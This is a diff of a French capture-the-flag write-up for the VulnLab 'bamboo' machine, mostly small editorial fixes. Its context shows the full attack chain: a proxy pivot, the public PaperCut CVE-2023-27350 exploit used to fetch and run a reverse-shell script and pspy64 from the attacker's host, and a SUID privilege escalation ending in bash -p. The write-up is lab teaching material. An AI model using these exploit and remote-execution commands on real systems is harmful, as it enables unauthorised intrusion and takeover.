@@ -1,13 +1,3 @@
-import { Image } from 'astro:assets';
-import bamboo3 from '../../../assets/writeup/vulnlab/bamboo/bamboo03.png';
-import bamboo2 from '../../../assets/writeup/vulnlab/bamboo/bamboo02.png';
-import bamboo4 from '../../../assets/writeup/vulnlab/bamboo/bamboo04.jpg';
-import bamboo5 from '../../../assets/writeup/vulnlab/bamboo/bamboo05.png';
-import bamboo6 from '../../../assets/writeup/vulnlab/bamboo/bamboo06.png';
-import bamboo7 from '../../../assets/writeup/vulnlab/bamboo/bamboo07.png';
-import bamboo8 from '../../../assets/writeup/vulnlab/bamboo/bamboo08.png';
-import bamboo9 from '../../../assets/writeup/vulnlab/bamboo/bamboo09.png';
-
 ---
 title: bamboo - Medium
 description: WU bamboo - Medium
@@ -15,7 +5,17 @@ categories: [Writeup]
 tags: [writeup]
 template: doc
 ---
-Date : 2024-09-10 11:04
+
+import { Steps } from '@astrojs/starlight/components';
+import { Image } from 'astro:assets';
+import bamboo3 from '../../../../assets/writeup/vulnlab/bamboo/bamboo03.png';
+import bamboo2 from '../../../../assets/writeup/vulnlab/bamboo/bamboo02.png';
+import bamboo4 from '../../../../assets/writeup/vulnlab/bamboo/bamboo04.jpg';
+import bamboo5 from '../../../../assets/writeup/vulnlab/bamboo/bamboo05.png';
+import bamboo6 from '../../../../assets/writeup/vulnlab/bamboo/bamboo06.png';
+import bamboo7 from '../../../../assets/writeup/vulnlab/bamboo/bamboo07.png';
+import bamboo8 from '../../../../assets/writeup/vulnlab/bamboo/bamboo08.png';
+import bamboo9 from '../../../../assets/writeup/vulnlab/bamboo/bamboo09.png';
 
 ## 🔭 Périmètre
 ```
@@ -54,11 +54,11 @@ Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds
 ```
 
 
-### Aperçu
+### Paper-NG abuse
 
-Nous atterrissons sur ```squid```.
+Nous accédons à `squid`.
 
-```Squid``` est un serveur proxy qui permet de mettre en cache les requêtes web pour optimiser l’accès à internet. Il peut agir comme un intermédiaire entre un client (comme un navigateur) et des serveurs web
+`Squid` est un serveur proxy qui permet de mettre en cache les requêtes web pour optimiser l’accès à internet. Il peut agir comme un intermédiaire entre un client (comme un navigateur) et des serveurs web
 
 Modification du fichier /etc/proxychains.conf.
 
@@ -82,7 +82,8 @@ Port 9192 is open.
 Port 9195 is open.
 Port 9191 is open.
 ```
-####Analyse des ports à travers le proxy.
+
+#### Analyse des ports à travers le proxy.
 
 ```shell wrap
 proxychains -q nmap -sC -sV -p22,9195,9192,9191 127.0.0.1
@@ -100,13 +101,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
 ```
 Dans ce qui ressort du résultat de la commande, nous pouvons voir le mot de passe de première connexion par défaut.
-J'essai sur Teresa.Bell :
+J'essaie sur Teresa.Bell :
 ```shell wrap
 crackmapexec smb 10.10.124.47 -u Teresa.Bell -p 'B<retracted>!' --no-bruteforce
 SMB         10.10.124.47    445    BABYDC           [*] Windows 10.0 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
 SMB         10.10.124.47    445    BABYDC           [-] baby.vl\Teresa.Bell:B<retracted>! STATUS_LOGON_FAILURE
 ```
-Utilisons ```curl``` pour faire nos requetes.
+Utilisons ```curl``` pour faire nos requêtes.
 
 ```shell wrap
 proxychains curl -v http://127.0.0.1:9191
@@ -211,16 +212,17 @@ proxychains -q python3 51391.py
 Enter the ip address: 127.0.0.1
 Version: 22.0.6
 Vulnerable version
-Step 1 visit this url first in your browser: http://127.0.0.1:9191/app?service=page/SetupCompleted
-Step 2 visit this url in your browser to bypass the login page : http://127.0.0.1:9191/app?service=page/Dashboard
 ```
-Step1
 
-<Image src={bamboo5} alt="bamboo5" format="avif" quality={"mid"}/>
+<Steps>
 
-Step2
+1. Visit this url first in your browser: http://127.0.0.1:9191/app?service=page/SetupCompleted
+   <Image src={bamboo5} alt="bamboo5" format="avif" quality={"mid"}/>
 
-<Image src={bamboo6} alt="bamboo6" format="avif" quality={"mid"}/>
+2. Visit this url in your browser to bypass the login page : http://127.0.0.1:9191/app?service=page/Dashboard
+   <Image src={bamboo6} alt="bamboo6" format="avif" quality={"mid"}/>
+
+</Steps>
 
 On peut naviguer dans le dashboard mais rien de plus. En cherchant un autre moyen nous trouvons cela sur github.
 https://github.com/horizon3ai/CVE-2023-27350
@@ -246,7 +248,7 @@ User-Agent: curl/7.81.0
 Accept: */*
 ```
 
-Visiblement ça marche !
+Et cela fonctionne !
 
 Allons plus loin :
 
@@ -280,7 +282,7 @@ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.96.36 - - [20/Sep/2024 08:52:02] "GET /revshell.py HTTP/1.1" 200 -
 ```
-Executons le revshell.py
+Exécutons le revshell.py
 
 ```shell wrap
 proxychains -q python3 CVE-2023-27350.py --url 'http://127.0.0.1:9191' --command "python3 /tmp/revshell.py"
@@ -304,15 +306,15 @@ papercut@bamboo:~/server$
 papercut@bamboo:~$ cat user.txt
 ```
 
-###Recherche privesc :
+### Privesc
 
-Nous trouvons des données importantes en executant ```pspy64```.
+Nous trouvons des données importantes en exécutant ```pspy64```.
 
 Les informations révélées par ```pspy64``` montrent que ```PaperCut``` est un composant critique du système, et plusieurs de ses processus sont exécutés avec des privilèges non-root (UID 1001).
 
 Cependant, en raison de la manière dont certains processus interagissent avec le système (comme la gestion des fichiers temporaires, le suivi des scripts, et le fait que PaperCut utilise des composants Java), il y a de fortes chances qu’il existe une faille d’escalade de privilèges.
 
-```shell wrap
+```shell
 proxychains -q python3 CVE-2023-27350.py --url 'http://127.0.0.1:9191' --command "curl http://10.8.3.57/pspy64 -o /tmp/pspy64"
 [*] Papercut instance is vulnerable! Obtained valid JSESSIONID
 [*] Updating print-and-device.script.enabled to Y
@@ -428,7 +430,7 @@ Sur cette page ```http://127.0.0.1:9191/app?service=page/PrintDeploy```. Cela r�
 
 Nous avons les droits en écriture dans ce dossier.
 
-Ajoutons le ```bit SUID``` sur server-command.
+Ajoutons le `bit SUID` sur server-command.
 
 ```shell wrap
 papercut@bamboo:~/server$ cd /home/papercut/server/bin/linux-x64/
@@ -472,7 +474,7 @@ Nous relançons le refresh depuis le dashboard de papercut.
 
 <Image src={bamboo9} alt="bamboo9" format="avif" quality={"mid"}/>
 
-Et executons simplement la commande suivante pour passer root.
+Et exécutons simplement la commande suivante pour passer root.
 
 ```shell wrap
 papercut@bamboo:~/server/bin/linux-x64$ bash -p
